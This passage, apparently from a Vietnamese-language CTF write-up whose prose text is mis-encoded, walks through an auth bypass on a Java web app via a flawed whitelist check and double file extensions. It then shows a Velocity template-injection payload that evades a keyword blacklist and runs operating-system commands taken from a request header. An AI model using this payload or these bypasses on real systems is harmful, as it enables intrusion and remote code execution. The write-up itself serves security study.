&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;resp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendRedirect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;/home/_error.page?errorMsg=&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;URLEncoder&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;StandardCharsets&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;UTF_8&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="n"&gt;catch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="n"&gt;var17&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="ne"&gt;String&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;auth failed2!&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;doFilter&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;resp&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;sendRedirect&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;/home/_error.page?errorMsg=&amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;URLEncoder&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;StandardCharsets&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;UTF_8&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="n"&gt;catch&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Exception&lt;/span&gt; &lt;span class="n"&gt;var18&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;var18&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;printStackTrace&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;error trying to authenticate: &amp;#34;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;var18&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getMessage&lt;/span&gt;&lt;span class="p"&gt;());&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;CÃ¢u há»i lÃ  lÃ m tháº¿ nÃ o Ä‘á»ƒ raise Exception var18 mÃ  khÃ´ng bá»‹ rÆ¡i vÃ o cÃ¡c exception khÃ¡c? CÃ¢u tráº£ lá»i sáº½ náº±m á»Ÿ biáº¿n format, Ä‘oáº¡n kiá»ƒm tra Ä‘áº§u vÃ o cá»§a format cÃ³ váº¥n Ä‘á», cá»¥ thá»ƒ lÃ  dÃ²ng:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;if (!&amp;#34;sha1,md5,sha256,sha512&amp;#34;.contains(format))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;GiÃ¡ trá»‹ Ä‘Æ°á»£c check Ä‘á»ƒ &lt;strong&gt;contains&lt;/strong&gt; trong chuá»—i kia, náº¿u nhÆ° ta truyá»n vÃ o &lt;code&gt;,sha512&lt;/code&gt; thÃ¬ sao?
Äoáº¡n check if contains sáº½ Ä‘Æ°á»£c pass, chÆ°Æ¡ng trÃ¬nh gá»i Ä‘áº¿n verifyUser:
&lt;img src="https://hackmd.io/_uploads/SyljEX_g-x.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Táº¡i Ä‘Ã¢y máº­t kháº©u Ä‘Æ°á»£c láº¥y tá»« user tÆ°Æ¡ng á»©ng, khÃ´ng sáº½ return false =&amp;gt; auth failed1! NÃªn username truyá»n vÃ o cáº§n pháº£i lÃ  &lt;code&gt;admin&lt;/code&gt;. HÃ m check tiáº¿p tá»¥c nháº£y vÃ o hÃ m hashPassword:
&lt;img src="https://hackmd.io/_uploads/BkIyVQOlZl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
HÃ m hashPassword sáº½ check format truyá»n vÃ o cÃ³ pháº£i má»™t thuáº­t toÃ¡n hash há»£p lá»‡ trong MessageDigest khÃ´ng:
&lt;img src="https://hackmd.io/_uploads/Bk_W4QOgZl.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Do &lt;code&gt;,sha512&lt;/code&gt; khÃ´ng valid nÃªn sáº½ raise exception &lt;code&gt;,sha512 MessageDigest not available&lt;/code&gt;, tá»« Ä‘Ã³ bypass Ä‘Æ°á»£c Ä‘oáº¡n whitelist if Ä‘áº§u:
&lt;img src="https://hackmd.io/_uploads/HyOGVXdlWe.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
&lt;em&gt;&lt;strong&gt;Set protect = false&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Xem láº¡i web.xml, cÃ¡c file cÃ³ extension nhÆ° sau Ä‘Æ°á»£c handle bá»Ÿi class EditContentParser&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;servlet&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;servlet-name&amp;gt;EditContentParser&amp;lt;/servlet-name&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;servlet-class&amp;gt;io.breach.EditContentParser&amp;lt;/servlet-class&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;/servlet&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;servlet-mapping&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;servlet-name&amp;gt;EditContentParser&amp;lt;/servlet-name&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;url-pattern&amp;gt;*.groovy&amp;lt;/url-pattern&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;/servlet-mapping&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;servlet-mapping&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;servlet-name&amp;gt;EditContentParser&amp;lt;/servlet-name&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;url-pattern&amp;gt;*.page&amp;lt;/url-pattern&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;/servlet-mapping&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;servlet-mapping&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;servlet-name&amp;gt;EditContentParser&amp;lt;/servlet-name&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;url-pattern&amp;gt;*.tpl&amp;lt;/url-pattern&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;/servlet-mapping&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;servlet-mapping&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;servlet-name&amp;gt;EditContentParser&amp;lt;/servlet-name&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &amp;lt;url-pattern&amp;gt;*.htm&amp;lt;/url-pattern&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&amp;lt;/servlet-mapping&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Khi gáº·p cÃ¡c file nÃ y, class call method service, thá»±c hiá»‡n parse URI Ä‘á»ƒ láº¥y ra tÃªn file cáº§n hiá»ƒn thá»‹. NhÆ°ng váº¥n lÃ  á»Ÿ Ä‘Ã¢y page_type láº¡i Ä‘Æ°á»£c láº¥y lÃ  pháº§n tá»­ tiÃªn sau dáº¥u cháº¥m, ngÆ°á»£c láº¡i vá»›i logic xá»­ lÃ½ &lt;code&gt;protect&lt;/code&gt;:
&lt;img src="https://hackmd.io/_uploads/rkWIDQOxZe.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Äá»ƒ &lt;code&gt;protect&lt;/code&gt; lÃ  false, ta cáº§n pháº£i truyá»n vÃ o file cÃ³ 2 extension:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Extension thá»© 2 khÃ´ng pháº£i lÃ  groovy =&amp;gt; page, tpl, htm Ä‘á»u Ä‘Æ°á»£c&lt;/li&gt;
&lt;li&gt;Extension thá»© nháº¥t lÃ  extension Ä‘Ãºng cá»§a file cáº§n truy cáº­p&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Káº¿t há»£p cáº£ 2 Ä‘iá»u kiá»‡n, ta cÃ³ request bypass authen Ä‘á»ƒ truy cáº­p file /admin/index.html:
&lt;img src="https://hackmd.io/_uploads/SybIOXdeWg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;&lt;/p&gt;
&lt;h4 id="ssti-in-velocity"&gt;SSTI In Velocity
&lt;/h4&gt;&lt;p&gt;Trong cÃ¡c file cÃ³ thá»ƒ truy cáº­p, tá»“n táº¡i editPage.groovy cho phÃ©p táº¡o file .page cÃ³ ná»™i dung tÃ¹y Ã½ truy cáº­p Ä‘Æ°á»£c tá»« webroot =&amp;gt; SSTI Velocity:
&lt;img src="https://hackmd.io/_uploads/Sk_ktm_xWg.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Váº¥n Ä‘á» cÃ²n láº¡i lÃ  bypass Ä‘á»‘ng blacklist nÃ y ná»¯a thÃ´i:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;span class="lnt"&gt;15
&lt;/span&gt;&lt;span class="lnt"&gt;16
&lt;/span&gt;&lt;span class="lnt"&gt;17
&lt;/span&gt;&lt;span class="lnt"&gt;18
&lt;/span&gt;&lt;span class="lnt"&gt;19
&lt;/span&gt;&lt;span class="lnt"&gt;20
&lt;/span&gt;&lt;span class="lnt"&gt;21
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;private&lt;/span&gt; &lt;span class="k"&gt;static&lt;/span&gt; &lt;span class="n"&gt;final&lt;/span&gt; &lt;span class="n"&gt;List&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="ne"&gt;String&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;BLACKLIST&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Arrays&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;asList&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;#34;runtime&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;processbuilder&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;eval&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;forName&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;scriptEngine&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;parse&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;#34;include&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;private&lt;/span&gt; &lt;span class="n"&gt;boolean&lt;/span&gt; &lt;span class="n"&gt;containsBlacklisted&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ne"&gt;String&lt;/span&gt; &lt;span class="n"&gt;input&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;input&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="n"&gt;null&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="ne"&gt;String&lt;/span&gt; &lt;span class="n"&gt;lower&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;input&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;toLowerCase&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;Iterator&lt;/span&gt; &lt;span class="n"&gt;var3&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;BLACKLIST&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;iterator&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="ne"&gt;String&lt;/span&gt; &lt;span class="n"&gt;forbidden&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="n"&gt;var3&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;hasNext&lt;/span&gt;&lt;span class="p"&gt;())&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;false&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="n"&gt;forbidden&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="ne"&gt;String&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;var3&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;next&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="n"&gt;lower&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;contains&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;forbidden&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;toLowerCase&lt;/span&gt;&lt;span class="p"&gt;()));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;true&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt; &lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Äa sá»‘ cÃ¡c payload Velocity SSTI Ä‘á»u dÃ¹ng forName Ä‘á»ƒ call class, Ä‘á»ƒ bypass thÃ¬ mÃ¬nh Ä‘Ã£ chá»n sá»­ dá»¥ng classloader. Sau má»™t há»“i fuzz tÃ¹m lum, mÃ¬nh tÃ¬m Ä‘Æ°á»£c object $request chá»©a instance cá»§a class RequestFacade:&lt;br&gt;
&lt;img src="https://hackmd.io/_uploads/H1DecXOlbe.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Tá»« Ä‘Ã¢y cÃ³ thá»ƒ call Ä‘áº¿n object URLClassLoader thÃ´ng qua payload &lt;code&gt;$request.servletContext.class.classLoader&lt;/code&gt;:
&lt;img src="https://hackmd.io/_uploads/BJH497ugZe.png"
loading="lazy"
alt="image"
&gt;&lt;br&gt;
Viá»‡c khÃ³ Ä‘Ã£ lÃ m Ä‘Æ°á»£c, giá» mÃ¬nh sáº½ dÃ¹ng nÃ³ Ä‘á»ƒ load class java.lang.Runtime, láº¥y command tá»« header 1337:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt; 1
&lt;/span&gt;&lt;span class="lnt"&gt; 2
&lt;/span&gt;&lt;span class="lnt"&gt; 3
&lt;/span&gt;&lt;span class="lnt"&gt; 4
&lt;/span&gt;&lt;span class="lnt"&gt; 5
&lt;/span&gt;&lt;span class="lnt"&gt; 6
&lt;/span&gt;&lt;span class="lnt"&gt; 7
&lt;/span&gt;&lt;span class="lnt"&gt; 8
&lt;/span&gt;&lt;span class="lnt"&gt; 9
&lt;/span&gt;&lt;span class="lnt"&gt;10
&lt;/span&gt;&lt;span class="lnt"&gt;11
&lt;/span&gt;&lt;span class="lnt"&gt;12
&lt;/span&gt;&lt;span class="lnt"&gt;13
&lt;/span&gt;&lt;span class="lnt"&gt;14
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#set($cl = $request.servletContext.class.classLoader)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#set($rt = $cl.loadClass(&amp;#34;java.lang.Run&amp;#34;+&amp;#34;time&amp;#34;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#set($g = $rt.getMethod(&amp;#34;getR&amp;#34;+&amp;#34;untime&amp;#34;,null))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#set($r = $g.invoke(null,null))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#set($cmd = $request.getHeader(&amp;#34;1337&amp;#34;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#set($exec = $rt.getMethod(&amp;#34;exec&amp;#34;,$cl.loadClass(&amp;#34;java.lang.String&amp;#34;)))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#set($p = $exec.invoke($r,$cmd))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#set($is = $p.getInputStream())&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#set($scClass = $cl.loadClass(&amp;#34;java.util.Scanner&amp;#34;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#set($sc = $scClass.getConstructor($cl.loadClass(&amp;#34;java.io.InputStream&amp;#34;)).newInstance($is))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#set($del = $scClass.getMethod(&amp;#34;useDelimiter&amp;#34;, $cl.loadClass(&amp;#34;java.lang.String&amp;#34;)))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#set($tmp = $del.invoke($sc, &amp;#34;\\A&amp;#34;))&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;#set($next = $scClass.getMethod(&amp;#34;next&amp;#34;))&lt;/span&gt;
